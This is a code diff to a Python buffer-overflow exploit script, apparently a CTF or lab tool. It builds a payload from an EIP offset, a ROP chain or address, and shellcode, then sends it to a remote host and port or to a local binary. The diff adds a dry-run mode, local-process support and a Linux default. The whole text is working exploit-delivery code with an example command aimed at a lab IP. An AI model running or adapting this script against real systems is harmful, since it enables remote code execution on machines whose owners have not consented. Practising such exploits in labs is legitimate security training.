@@ -22,8 +22,8 @@ Run exploit
 
   $ ./exploit.py -H 10.10.76.237 -p 31337 --sf $'\\n' -o 146 -e '0x080414c3'
 """)
-parser.add_argument('-H','--host', help='Target host', required=True)
-parser.add_argument('-p','--port', help='Target port', required=True)
+parser.add_argument('-H','--host', help='Target host')
+parser.add_argument('-p','--port', help='Target port')
 parser.add_argument('-o','--offset', help='EIP offset', required=True, type=int)
 
 parser.add_argument('-e','--eip', help='Value to overwrite EIP with or ROP chain. Ie. 0x01010101,0x02020202,0x03030303')
@@ -33,7 +33,8 @@ parser.add_argument('-s','--size', help='Payload size', default=-1, type=int)
 parser.add_argument('-sf','--suffix', help='Payload suffix, Ie. USER ', default='')
 parser.add_argument('-pf','--prefix', help="Payload prefix, Ie. \\n", default='')
 parser.add_argument('-a','--arch', help='Target architecture. Ie. x86 or amd64', default='x86')
-parser.add_argument('-O','--os', help='Target OS. Ie. windows or linux', default='windows')
+parser.add_argument('-O','--os', help='Target OS. Ie. windows or linux', default='linux')
+parser.add_argument('-d','--dry', help='Dry run. Print would be paylad.', action="store_true")
 parser.add_argument('-v','--debug', help='Show debug information', action="store_true")
 
 args = parser.parse_args()
@@ -87,6 +88,14 @@ if (args.size == -1):
 if (args.size < used_size):
   parser.error( f"Increase -s/--size. Can't fit useful payload of size {used_size} into size {args.size}.")
 
+if args.host is not None and args.port is not None:
+  if not args.dry:
+    c = remote(args.host, args.port)
+elif binary is not None:
+    c = process(binary)
+else:
+    parser.error("Set remote -H/--host and -p/--port and/or local binary -b/--bin.")
+
 log.info(f"Shellcode size {len(shellcode)}")
 log.info(f"Useful size (offset + ROP + shellcode + suffix) {used_size}")
 
@@ -98,10 +107,15 @@ payload = args.prefix + payload + args.suffix
 
 log.info(f"Payload size {len(payload)}")
 
-c = remote(args.host, args.port)
-
 log.info("Sending payload")
-c.send(payload)
-c.settimeout(3)
-log.info("Listening for response")
-c.recv(1024)
+
+if (args.dry):
+  print(payload)
+else:
+  c.send(payload)
+  c.settimeout(3)
+  log.info("Listening for response")
+  out = c.recv(1024)
+  print(out)
+
+log.info("Done")
